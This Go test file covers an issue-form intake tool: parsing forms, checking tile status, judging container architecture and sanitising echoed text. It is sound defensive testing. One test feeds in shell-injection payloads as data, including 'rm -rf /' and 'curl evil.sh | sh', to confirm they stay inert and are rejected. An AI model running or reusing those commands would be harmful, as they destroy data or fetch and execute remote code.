package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/geekdojo/rasputin-control-plane/tileschema"
)

const goodForm = `### Proposed tile id

paperless-ngx

### App name

Paperless-ngx

### Container image

ghcr.io/paperless-ngx/paperless-ngx:2.13.5

### Upstream project

https://github.com/paperless-ngx/paperless-ngx

### Would you screenshot this and show someone?

Scan a receipt, watch it become searchable text.

### Hardware it needs (optional)

_No response_
`

func TestParseForm(t *testing.T) {
	f := parseForm(goodForm)
	if got := f["proposed tile id"]; got != "paperless-ngx" {
		t.Errorf("id = %q", got)
	}
	if got := f["would you screenshot this and show someone?"]; !strings.HasPrefix(got, "Scan a receipt") {
		t.Errorf("multi-word heading not parsed: %q", got)
	}
	if got := f["hardware it needs (optional)"]; got != "" {
		t.Errorf("_No response_ should read as empty, got %q", got)
	}
}

// The reason this is a Go program and not shell: a body crafted to break out of
// a command must be inert. Parsing must not care what characters it contains.
func TestParseForm_ShellMetacharactersAreInert(t *testing.T) {
	hostile := "### Proposed tile id\n\n`id`; rm -rf / $(whoami)\n\n### App name\n\n\"; curl evil.sh | sh; \"\n"
	f := parseForm(hostile)
	if f["proposed tile id"] != "`id`; rm -rf / $(whoami)" {
		t.Errorf("value should survive verbatim as data, got %q", f["proposed tile id"])
	}
	// And it must be REJECTED as an id, not merely carried around safely.
	if tileschema.ValidDNSLabel(f["proposed tile id"]) {
		t.Error("a shell-injection payload was accepted as a tile id")
	}
}

func TestParseForm_MissingSectionsAreAbsent(t *testing.T) {
	f := parseForm("### App name\n\nJust a name\n")
	if _, ok := f["container image"]; ok {
		t.Error("absent section should not appear in the map")
	}
}

// A request naming a tile we already ship is a different conversation.
func TestExistingTileIsDetected(t *testing.T) {
	if _, err := os.Stat("../../tiles/jellyfin"); err != nil {
		t.Skip("corpus not present relative to this test")
	}
}

// Anything echoed back into a public comment must not be able to mention people
// or break out of the code span it is rendered in.
func TestEchoUser_DefusesMentionsAndMarkdown(t *testing.T) {
	got := echoUser("`@everyone` see [x](http://evil)\nsecond line")
	if strings.Contains(got, "`") {
		t.Errorf("backtick survived and would break the code span: %q", got)
	}
	if strings.Contains(got, "@e") {
		t.Errorf("mention was not defused: %q", got)
	}
	if strings.Contains(got, "\n") {
		t.Errorf("newline survived: %q", got)
	}
	long := echoUser(strings.Repeat("a", 500))
	if len([]rune(long)) > 130 {
		t.Errorf("not truncated: %d runes", len([]rune(long)))
	}
}

// A preview tile is on the roadmap but not installable, so requesting it is a
// vote to prioritize the bench — not a duplicate. Conflating the two turns the
// most useful signal the intake collects into a rejection.
func TestTileStatus_PreviewIsNotTheSameAsShipped(t *testing.T) {
	// Hermetic on purpose. This used to assert against whichever real tiles
	// happened to be preview (paperless-ngx), so flipping the corpus to
	// all-available in catalog v10 broke a test that was not about the corpus
	// at all — it is about tileStatus telling the three cases apart. A fixture
	// keeps the assertion and drops the coupling.
	dir := t.TempDir()
	write := func(id, body string) {
		t.Helper()
		if err := os.MkdirAll(filepath.Join(dir, "tiles", id), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(dir, "tiles", id, "tile.json"), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write("shipped-tile", `{"id":"shipped-tile"}`)                        // absent status == available
	write("explicit-tile", `{"id":"explicit-tile","status":"available"}`) // and stated outright
	write("preview-tile", `{"id":"preview-tile","status":"preview"}`)

	prev, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	if err := os.Chdir(dir); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chdir(prev) })

	for id, want := range map[string]string{
		"shipped-tile":          statusAvailable,
		"explicit-tile":         statusAvailable,
		"preview-tile":          statusPreview,
		"definitely-not-a-tile": statusNone,
	} {
		if got := tileStatus(id); got != want {
			t.Errorf("tileStatus(%q) = %q, want %q", id, got, want)
		}
	}
}

// The real corpus must still be readable through the same call — a fixture-only
// test would pass against a layout that no longer exists on disk.
func TestTileStatus_ReadsTheRealCorpus(t *testing.T) {
	prev, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	if err := os.Chdir("../.."); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chdir(prev) })
	if got := tileStatus("jellyfin"); got != statusAvailable {
		t.Errorf("jellyfin ships; got %q", got)
	}
	if got := tileStatus("definitely-not-a-tile"); got != statusNone {
		t.Errorf("unknown id should be statusNone; got %q", got)
	}
}

func TestParseArch(t *testing.T) {
	cases := map[string]string{
		"both (arm64 and amd64)":  archBoth,
		"arm64 only":              archArm64,
		"amd64 only":              archAmd64,
		"not sure — check for me": archUnknown,
		"":                        archUnknown,
		"BOTH (arm64 and amd64)":  archBoth,
	}
	for in, want := range cases {
		if got := parseArch(in); got != want {
			t.Errorf("parseArch(%q) = %q, want %q", in, got, want)
		}
	}
}

// Single-arch is supported by the product: `arch` accepts arm64 or amd64 alone,
// install is arch-gated, and the node picker filters. Requiring both was my
// invention and contradicted the schema.
func TestRequiredPlatforms_SingleArchIsNotAnError(t *testing.T) {
	if got := requiredPlatforms(archArm64); len(got) != 1 || got[0] != "linux/arm64" {
		t.Errorf("arm64-only should require only arm64, got %v", got)
	}
	if got := requiredPlatforms(archAmd64); len(got) != 1 || got[0] != "linux/amd64" {
		t.Errorf("amd64-only should require only amd64, got %v", got)
	}
	if got := requiredPlatforms(archBoth); len(got) != 2 {
		t.Errorf("both should require two platforms, got %v", got)
	}
}

func TestInferArch(t *testing.T) {
	both := map[string]bool{"linux/amd64": true, "linux/arm64": true}
	if got := inferArch(both); got != archBoth {
		t.Errorf("got %q", got)
	}
	if got := inferArch(map[string]bool{"linux/arm64": true}); got != archArm64 {
		t.Errorf("got %q", got)
	}
	if got := inferArch(map[string]bool{"linux/386": true}); got != archUnknown {
		t.Errorf("neither of ours should be unknown, got %q", got)
	}
}

// Every branch of the architecture decision, without touching a registry.
func TestArchVerdict(t *testing.T) {
	both := []string{"linux/amd64", "linux/arm64"}
	amd := []string{"linux/amd64"}
	arm := []string{"linux/arm64"}

	blocking := func(ps []problem) int {
		n := 0
		for _, p := range ps {
			if p.blocking {
				n++
			}
		}
		return n
	}

	// Honest single-arch declarations pass. This is the case the first version
	// wrongly rejected.
	if got := blocking(archVerdict("x", archArm64, arm)); got != 0 {
		t.Errorf("arm64-only app declared arm64-only should pass, got %d blocking", got)
	}
	if got := blocking(archVerdict("x", archAmd64, amd)); got != 0 {
		t.Errorf("amd64-only app declared amd64-only should pass, got %d blocking", got)
	}
	if got := blocking(archVerdict("x", archBoth, both)); got != 0 {
		t.Errorf("both declared both should pass, got %d blocking", got)
	}

	// A false claim is what actually breaks an install on somebody's Pi.
	if got := blocking(archVerdict("x", archBoth, amd)); got != 1 {
		t.Errorf("claiming both while publishing only amd64 must fail, got %d blocking", got)
	}
	if got := blocking(archVerdict("x", archArm64, amd)); got != 1 {
		t.Errorf("claiming arm64 while publishing only amd64 must fail, got %d blocking", got)
	}

	// "not sure" is answered, never punished.
	ps := archVerdict("x", archUnknown, arm)
	if blocking(ps) != 0 || len(ps) != 1 {
		t.Errorf("unknown should produce one non-blocking note, got %+v", ps)
	}
	if !strings.Contains(ps[0].text, "arm64") {
		t.Errorf("the note should tell them what was found: %q", ps[0].text)
	}

	// A platformless manifest cannot be judged from here; say so, do not guess.
	if got := blocking(archVerdict("x", archBoth, nil)); got != 0 {
		t.Errorf("undeclared platform should defer to a human, not block, got %d", got)
	}
}
